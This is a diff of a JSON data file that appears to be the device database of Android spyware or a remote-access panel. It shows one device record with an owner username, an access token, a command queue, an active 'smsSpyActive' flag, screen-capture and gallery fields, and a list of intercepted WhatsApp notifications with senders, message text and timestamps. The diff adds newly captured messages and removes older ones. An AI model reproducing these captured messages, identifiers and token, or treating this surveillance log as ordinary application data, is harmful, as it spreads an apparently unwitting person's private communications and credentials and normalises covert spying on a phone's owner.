@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775927894512,
+    "lastSeen": 1775927899988,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
+        "content": "‎10 pesan baru",
+        "time": "12/04 00:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927900539
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (10 pesan): ~ m!kel",
+        "content": "4T masuk ora",
+        "time": "12/04 00:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927897511
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
+        "content": "‎10 pesan baru",
+        "time": "12/04 00:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927897504
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
@@ -4099,30 +4123,6 @@
         "time": "11/04 23:29",
         "pkg": "com.whatsapp",
         "receivedAt": 1775924944245
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "~ rzqii: hm toyongin",
-        "time": "11/04 23:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924935848
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈: ~ rzqii",
-        "content": "hm toyongin",
-        "time": "11/04 23:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924935762
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "‎24 pesan baru",
-        "time": "11/04 23:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775924921232
       }
     ],
     "galleryPhotos": [],
